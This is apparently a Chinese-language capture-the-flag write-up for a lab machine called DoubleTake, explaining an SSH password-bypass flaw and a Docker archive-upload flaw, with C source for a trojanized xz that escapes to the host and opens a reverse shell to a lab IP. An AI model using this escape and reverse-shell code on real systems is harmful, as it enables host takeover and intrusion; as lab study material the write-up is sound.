DoubleTake

About：DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the alpine user by sending a 300-byte password that causes musl’s crypt() to return "*", matching the locked account’s shadow entry. Inside the container, a saved Firefox login reveals credentials for the web application on port 80. The platform exposes a deploy endpoint that forwards archives to the Docker API’s PUT /containers/{id}/archive. Docker 29.5.0 is vulnerable to CVE-2026-41567, which resolves decompression binaries from the container’s overlay filesystem instead of the host’s. Replacing /usr/bin/xz in the container and uploading a compressed archive through the deploy page causes the Docker daemon to execute the trojanized binary as host root.

介绍：DoubleTake 是一台难度较低的 Linux 机器，运行在 Docker 容器后方的 AI 代理平台。22 端口通过 Alpine 容器提供 SSH 服务，该容器使用基于 musl 编译的 OpenSSH 10.6p1 版本。CVE-2026-123158 通过发送 300 字节的密码绕过 alpine 用户的密码验证，导致 musl 的 crypt() 返回“*”，与锁定帐户的影子条目匹配。在容器内部，保存的 Firefox 登录信息会显示端口 80 上 Web 应用程序的凭据。该平台公开了一个部署端点，该端点会将归档文件转发到 Docker API 的 PUT /containers/{id}/archive。Docker 29.5.0 存在 CVE-2026-41567 漏洞，该漏洞会从容器的 overlay 文件系统而不是主机的文件系统中解析解压缩二进制文件。在容器中替换 /usr/bin/xz 并通过部署页面上传压缩归档文件会导致 Docker 守护程序以主机 root 用户身份执行木马化的二进制文件。

立足点

CVE-2026-123158 (sshole)

四个独立的设计，结合起来导致了这个绕过：

  1. BSD 约定，不能使用密码认证的账户在 /etc/shadow 文件中的密码字段为 *。
  2. musl 的 crypt() 函数在失败后返回字符 *。
  3. musl 的 SHA-256/512 限制密钥在 256 字节以内。所以一个长度超过 256 字节的密码将触发 crypt() 的失败，从而返回字符 "*" 。
  4. OpenSSH 为修复 CVE-2016-6210，添加了一条规则：如果 shadow 文件中的密码字段过短，没有合法盐值，会从别的用户那里借 $6$ 盐值。从而导致这个登录请求走到 musl 的 crypt() 分支，触发长度限制的 bug，返回 "*"，最终绕过登录。

这就导致所有 shadow 文件中密码字段为 * 的账户都成为可以 bypass 的目标，但前提是 sshd 允许账户尝试密码登录。

所以，虽然 root 用户的密码字段也是 *，但是由于 PermitRootLogin 为 no，所以系统会禁止 root 密码登录。

但是在 Alpine Linux 机器上，系统用户 alpine 的密码字段也是 *，并且没有被 PermitRootLogin 限制，所以我们可以 bypass 登录 alpine。


具体的执行过程是，我们生成一个长度 > 256 字节的字符串，作为 alpine 的密码传入。sshd 会借用其它用户的盐值 $6$ ，与我们传入的字符串一同输入给 crypt()，由于长度过长，函数返回一个 *。然后 sshd 再用这个 * 与 shadow 文件中的密码字段比较，由于 *==*，所以比较成功，顺利登录。

注意，这里需要尝试两次密码，因为第一次会调用getspnam() 查找盐 donor，该 salt donor 覆盖了 shadow_pw() 返回的静态缓冲区。存储字段第一次尝试时不再读出*，因此失败。但pick_salt()会将借来的盐缓存在静态变量中。第二次尝试时，shadow_pw()从新的getspnam()调用中重新加载*，pick_salt()返回缓存，且不再次触及缓冲区。这个比较成立。

Web 侦察

Web 页面是一个名叫 Zentara 的 AI 聊天助手。

在 Deploy 页面有一个文件上传接口，可以上传压缩包 .tar .tar.gz .tar.xz

而 Status 页面展示了网站的配置，暴露了 Docker 版本为 29.5.0。

CVE-2026-41567

Docker 直到 29.5.0 版本，在 PUT /containers/{id}/archive 都存在二进制解析缺陷漏洞。

当守护进程收到压缩包后，会按照程序名去容器的 overlay 文件系统里查找解压程序，而不是主机上的解压程序。

这些被解压得到的二进制程序，会以该守护进程的身份允许，也就是宿主机的 root 权限运行，并且拥有无限制权限，包括 CAP_SYS_ADMIN。

受影响的程序为 xz 和 unpigz。

Docker 里存在 xz。

1
2

7f906e0ee8ec:~$ which xz
/usr/bin/xz

在攻击者机器上编译一个静态替代 xz。

当 Docker 守护进程调用它时，进程继承 CAP_SYS_ADMIN 并在主机 PID 命名空间中运行。

将 procfs 挂载并 chroot 到 /proc/1/root 可以访问主机文件系统。

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    // 挂载proc文件系统
    mount("proc", "/proc", "proc", 0, NULL);
    // chroot切换根到宿主机PID1的根目录,完成逃逸
    chroot("/proc/1/root");
    chdir("/");
    // 反弹shell
    execl("/bin/bash", "bash", "-c",
         "bash -i >& /dev/tcp/10.10.17.69/1234 0>&1", NULL);
    return 1;
}
